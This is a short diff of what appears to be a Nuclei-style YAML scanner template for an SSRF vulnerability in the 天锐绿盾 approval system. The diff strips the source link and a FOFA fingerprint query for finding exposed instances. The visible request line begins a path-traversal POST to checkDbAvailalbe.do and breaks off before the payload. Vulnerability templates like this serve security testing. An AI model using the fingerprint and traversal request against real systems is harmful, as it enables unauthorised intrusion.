@@ -3,12 +3,8 @@ info:
   name: 天锐绿盾审批系统 checkDbAvailalbe.do 存在SSRF漏洞
   author: hacktwo
   severity: medium
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gdng9wwkd2o85vgz'
+  description: ''
   tags: ssrf,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gdng9wwkd2o85vgz
-    fofa: body="location.href=location.href+\"trwfe\";"||body="天锐绿盾"
 http:
 - raw:
   - 'POST /trwfe/login.jsp/.%2e/config/checkDbAvailalbe.do HTTP/1.1
